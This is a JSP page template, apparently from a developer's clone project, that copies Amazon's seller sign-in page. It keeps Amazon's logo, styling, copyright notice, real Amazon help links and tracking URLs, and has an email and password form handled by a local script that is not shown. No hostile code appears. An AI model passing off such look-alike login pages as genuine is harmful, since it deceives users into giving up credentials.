<%--
  ~ Created by Shravan on  14/2/18 11:53 PM.
  ~ Copyright (c) 2018. All rights reserved.
  --%>

<%--
  Created by IntelliJ IDEA.
  User: shravan
  Date: 14/2/18
  Time: 11:53 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<!doctype html>

<html class="a-no-js">
<head>
    <meta charset="utf-8">
    <title dir="ltr">Amazon Seller Sign IN</title>
    <link rel="stylesheet" href="../css/bootstrap.min.css">

    <!-- <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61gbb09bfIL._RC|11Fd9tJOdtL.css,21ULbzscqzL.css,31Q3id-QR0L.css,31QszevPBSL.css_.css#AUIClients/AmazonUI.min" /> -->
    <link rel="stylesheet" href="../css/amazon1.css"/>
    <link rel="stylesheet" href="../css/amazon2.css"/>
    <script src="../js/jquery.min.js"></script>
    <script src="../js/jquery.cookie.js"></script>
    <script src="../js/sellerlogin.js"></script>
    <!-- <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-e91ba5c6e67c58c7f9c4c413fa67697feade389e._V2_.css#AUIClients/CVFAssets.secure.min" /> -->
</head>
<body>
<div id="alerts"></div>
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
            <div class="a-section a-spacing-medium a-text-center">
                <a class="a-link-nav-icon" tabindex="-1" href="/">
                    <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>
                    <i class="a-icon a-icon-domain-in a-icon-domain"></i>
                </a>
            </div>
        </div>
        <div class="a-section a-spacing-base auth-pagelet-container">
            <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning">
                <div class="a-box-inner a-alert-container">
                    <h4 class="a-alert-heading">Please Enable Cookies to Continue</h4>
                    <i class="a-icon a-icon-alert"></i>
                    <div class="a-alert-content">
                        <p>
                            <a class="a-link-normal" href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">
                            </a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section auth-pagelet-container">

            <div class="a-section a-spacing-base">
                <div class="a-section">
                    <form name="signIn" id = "signIn" novalidate action='#'>
                        <div class="a-section">
                            <div class="a-box">
                                <div class="a-box-inner a-padding-extra-large">
                                    <h1 class="a-spacing-small">
                                       Seller Login
                                    </h1>
                                    <!-- optional subheading element -->
                                    <div class="a-row a-spacing-base">
                                        <label for="ap_email" class="a-form-label">
                                            Email
                                        </label>
                                        <input type="email" maxlength="128" id="ap_email" name="email" tabindex="1"
                                               class="a-input-text a-span12 auth-autofocus auth-required-field">
                                        <br>
                                        <span class="error text-danger" id="emailError"></span>
                                        <br>
                                        <%--<div class="form-group">
                                            <strong>Password</strong>
                                            <input id="signinPassword" type="password" maxlength="25" class="form-control">
                                        </div>--%>
                                        <label for="ap_password" class="a-form-label">
                                            Password
                                            <span class="right"><a href="#">Forgot your password?</a></span>
                                        </label>

                                        <input type="password" maxlength="128" id="ap_password" name="psword"
                                               tabindex="1"
                                               class="a-input-text a-span12 auth-autofocus auth-required-field">
                                        <span class="error text-danger" id="passwordError"></span>
                                    </div>
                                    <div class="a-section">
                                    <span id="continue" class="a-button a-button-span12 a-button-primary"><span
                                            class="a-button-inner"><input id="continue" tabindex="5"
                                                                          class="a-button-input" type="submit"
                                                                          aria-labelledby="continue-announce"><span
                                            id="continue-announce" class="a-button-text" aria-hidden="true">
                                    continue
                                    </span></span>
                                    </span>
                                    </div>
                                    <div class="a-section">
                                        <div aria-live="polite"
                                             class="a-row a-expander-container a-expander-inline-container">

                                            <div aria-expanded="false"
                                                 class="a-expander-content a-expander-inline-content a-expander-inner"
                                                 style="display:none">
                                                <a id="auth-fpp-link-bottom" class="a-link-normal"
                                                   href="https://www.amazon.in/ap/forgotpassword?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_youraccount_nav_youraccount_signout%26signIn%3D1%26useRedirectOnSuccess%3D1&prevRID=FBET0ZQEF9FTK4P81YVP&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&prepopulatedLoginId=&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=inflex&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
                                                    Forgot Password
                                                </a>
                                            </div>
                                            <div aria-expanded="false"
                                                 class="a-expander-content a-expander-inline-content a-expander-inner"
                                                 style="display:none">
                                                <a id="ap-other-signin-issues-link" class="a-link-normal"
                                                   href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">
                                                    Other issues with sign in
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="a-divider a-divider-break">
                    <h5>New to Amazon?</h5>
                </div>
                <span id="auth-create-account-link" class="a-button a-button-span12"><span class="a-button-inner"><a
                        id="createAccountSubmit" tabindex="6" href="/sellerregister" class="a-button-text" role="button">
                  Create your Amazon seller account
                  </a></span></span>
            </div>
        </div>
        <div id="right-2">
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener noreferrer"
                   href="#">
                    Conditions of Use
                </a>
                <span class="auth-footer-seperator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener noreferrer"
                   href="#">
                    Privacy Notice
                </a>
                <span class="auth-footer-seperator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
                    Help
                </a>
                <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  © 1996-2018, Amazon.com, Inc. or its affiliates
                  </span>
            </div>
        </div>
    </div>
    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>
    <!-- cache slot rendered -->
</div>
<div id='be' style="display:none;visibility:hidden;">
    <form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1'/></form>
</div>
<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;'
         src='//fls-eu.amazon.com/1/batch/1/OP/A21TJRUUN4KGV:262-6062281-6227166:FBET0ZQEF9FTK4P81YVP$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DFBET0ZQEF9FTK4P81YVP:0'
         alt=""/>
</noscript>
</body>
</html>
